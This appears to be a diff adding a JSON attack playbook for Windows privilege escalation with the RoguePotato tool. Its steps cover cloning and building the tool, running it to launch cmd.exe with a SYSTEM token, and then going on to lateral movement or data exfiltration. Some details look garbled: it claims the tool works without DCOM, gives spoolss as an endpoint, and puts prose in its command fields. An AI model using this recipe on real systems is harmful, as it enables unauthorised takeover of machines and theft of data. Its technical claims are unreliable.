@@ -1,0 +1,31 @@
+{
+    "name": "Windows Privilege Escalation with Rogue Potato",
+    "description": "Exploit local RPC with custom endpoints to impersonate tokens and escalate without DCOM, targeting Windows 10+ mitigations.",
+    "tools": [
+        {
+            "name": "RoguePotato",
+            "description": "RPC-based potato using rogue named pipes and CoGetCallContext for impersonation",
+            "url": "https://github.com/antonioCoco/RoguePotato"
+        }
+    ],
+    "steps": [
+        {
+            "index": 1,
+            "name": "Download RoguePotato",
+            "command": "git clone https://github.com/antonioCoco/RoguePotato.git; cd RoguePotato; Build RoguePotato.exe",
+            "description": "Clone the repo, compile using Visual Studio, and prepare the binary for the target architecture."
+        },
+        {
+            "index": 2,
+            "name": "Execute RoguePotato",
+            "command": "./RoguePotato.exe -r <RPC_endpoint> -e <executable> -a \"<arguments>\"",
+            "description": "Run with a reachable RPC endpoint (e.g., spoolss), the target executable (e.g., cmd.exe), and arguments for the elevated payload."
+        },
+        {
+            "index": 3,
+            "name": "Verify and Exploit",
+            "command": "Check with tasklist or whoami in the new process",
+            "description": "Ensure the impersonated token leads to SYSTEM; proceed with lateral movement or data exfiltration."
+        }
+    ]
+}
